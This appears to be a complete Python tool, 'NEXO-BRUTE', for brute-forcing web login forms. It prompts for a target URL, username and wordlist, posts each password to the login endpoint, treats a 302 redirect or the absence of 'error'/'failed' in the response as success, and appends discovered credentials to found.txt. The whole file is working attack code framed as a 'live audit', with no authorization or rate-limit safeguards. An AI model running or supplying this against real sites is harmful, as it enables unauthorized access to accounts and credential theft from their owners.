import requests
import time
import sys
import os

# --- NEXO Colors ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear')
    print(f"{C}{B}")
    print(r"  _   _  _______   _____    ____   _____  _    _  _______ ______ ")
    print(r" | \ | | | ____\ \ / / _ \  |  _ \ |  __ \| |  | ||__   __|  ____|")
    print(r" |  \| | | |__   \ V / | | | | |_) || |__) | |  | |   | |  | |__   ")
    print(r" | . ` | |  __|   > <| | | | |  _ < |  _  /| |  | |   | |  |  __|  ")
    print(r" | |\  | | |____ / . \ |_| | | |_) || | \ \| |__| |   | |  | |____ ")
    print(r" |_| \_| |______/_/ \_\___/  |____/ |_|  \_\\____/    |_|  |______|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  PROJECT:     {W}NEXO-BRUTE V1.1")
    print(f"{Y}  STATUS:      {G}LIVE AUDIT ACTIVE{W}")
    print(f"{G}======================================================={W}\n")

def brute_force():
    show_banner()
    
    # Configuration
    target_url = input(f"{Y}[?] Target URL: {W}").strip()
    username = input(f"{Y}[?] Username:   {W}").strip()
    wordlist_path = input(f"{Y}[?] Wordlist:   {W}").strip()
    
    if not os.path.exists(wordlist_path):
        print(f"{R}[!] Error: Wordlist file not found!{W}")
        return

    # Count total passwords for progress tracking
    print(f"{C}[*] Counting passwords in list...{W}")
    total_pwds = sum(1 for line in open(wordlist_path, 'r', errors='ignore'))
    
    print(f"{G}[+] Loaded {total_pwds} passwords.{W}")
    print(f"{C}[*] Starting Attack Engine...{W}\n")
    time.sleep(1)

    count = 0
    start_time = time.time()

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                password = password.strip()
                if not password: continue
                
                count += 1
                # LIVE STATUS BAR
                sys.stdout.write(f"\r{Y}[{count}/{total_pwds}] {C}Testing: {W}{password[:15]:<15} {G}Status: {W}Scanning...")
                sys.stdout.flush()

                # Simulation Logic (Payload names must match the target's HTML code)
                payload = {'username': username, 'password': password}
                
                try:
                    # Professionals use 'allow_redirects=False' to detect 302 Success redirects
                    response = requests.post(target_url, data=payload, timeout=5, allow_redirects=False)
                    
                    # SUCCESS CRITERIA:
                    # 1. Check for a '302' redirect (Common for successful login)
                    # 2. Check if the page content does NOT contain "failed" or "invalid"
                    if response.status_code == 302 or ("error" not in response.text.lower() and "failed" not in response.text.lower()):
                        print(f"\n\n{G}{B}[!!!] PASSWORD DISCOVERED [!!!]{W}")
                        print(f"{G}======================================={W}")
                        print(f"{Y}TARGET:   {W}{target_url}")
                        print(f"{Y}USER:     {G}{username}")
                        print(f"{Y}PASSWORD: {G}{password}")
                        print(f"{G}======================================={W}")
                        
                        # Save result to a file
                        with open("found.txt", "a") as found_file:
                            found_file.write(f"URL: {target_url} | User: {username} | Pass: {password}\n")
                        return
                        
                except requests.exceptions.RequestException:
                    sys.stdout.write(f"\r{R}[!] Connection Lost. Retrying...{' ':<20}")
                    time.sleep(2)
                    
        print(f"\n\n{R}[-] Audit Finished. No match found in the provided wordlist.{W}")

    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Session terminated by user.{W}")

if __name__ == "__main__":
    brute_force()
	
